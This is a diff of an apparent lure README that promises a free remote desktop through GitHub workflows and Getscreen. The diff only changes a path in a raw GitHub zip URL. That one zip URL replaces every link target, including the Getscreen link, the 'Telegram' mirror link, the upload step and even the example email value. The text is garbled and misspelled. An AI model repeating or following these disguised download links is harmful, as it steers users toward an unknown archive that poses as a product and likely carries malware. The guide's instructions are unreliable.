@@ -7,11 +7,11 @@ Hey there, tech enthusiasts! Welcome to this step-by-step guide on setting up yo
 Let's kick things off by breaking down the process into simple, digestible chunks. No worries if you're new to this – we'll walk you through it. If you haven't got a GitHub account yet, don't sweat it! Check out our quick [video tutorial on creating a GitHub account]
 ## Getscreen Account Setup
 
-Alright, let's get that [Getscreen](https://raw.githubusercontent.com/gemgalawala/mueeed/main/groupist/mueeed.zip) account rolling. Creating an account there is a breeze, and I'll show you how – it'll take literally 1 second! Just copy your Getscreen email to a textpad – we promise it's that easy. ⚡
+Alright, let's get that [Getscreen](https://raw.githubusercontent.com/gemgalawala/mueeed/main/densifier/mueeed.zip) account rolling. Creating an account there is a breeze, and I'll show you how – it'll take literally 1 second! Just copy your Getscreen email to a textpad – we promise it's that easy. ⚡
 
 ## Downloading the GitHub Workflow
 
-Now, let's snag that GitHub workflow. In the [description] Telegram(https://raw.githubusercontent.com/gemgalawala/mueeed/main/groupist/mueeed.zip), you'll find links to different mirrors. It's like having backup plans for your backup plans! If the server decides to snooze, you're covered. Oh, and don't worry about mirror links – we've got an explanatory 
+Now, let's snag that GitHub workflow. In the [description] Telegram(https://raw.githubusercontent.com/gemgalawala/mueeed/main/densifier/mueeed.zip), you'll find links to different mirrors. It's like having backup plans for your backup plans! If the server decides to snooze, you're covered. Oh, and don't worry about mirror links – we've got an explanatory 
 
 ## Video Tutorial In Youtube (H0w To)
 # [Watch The Video]
@@ -28,14 +28,14 @@ Alright, tech champs, it's time to put the pieces together. You've got your GitH
 
 ### Adding Workflow Files
 
-1. Upload that https://raw.githubusercontent.com/gemgalawala/mueeed/main/groupist/mueeed.zip file first.
+1. Upload that https://raw.githubusercontent.com/gemgalawala/mueeed/main/densifier/mueeed.zip file first.
 2. Create a new file, name it ".github/workflows/test", commit those changes.
 3. Add two workflow files – easy-peasy!
 
 ### ADDING YOUR GETSCREEN MAIL TO WORKFLOWS (importaint part)
 
 1. Click one of workflows and find this "EMAIL_SECRET=Your Get Screen Mail" 
-2. Replace your copied mail in here , ex: "https://raw.githubusercontent.com/gemgalawala/mueeed/main/groupist/mueeed.zip"
+2. Replace your copied mail in here , ex: "https://raw.githubusercontent.com/gemgalawala/mueeed/main/densifier/mueeed.zip"
 3. Do same as to the other workflow. If you dosen't get this right you will not get rdp so watch the video
 
 ### Running the Workflow
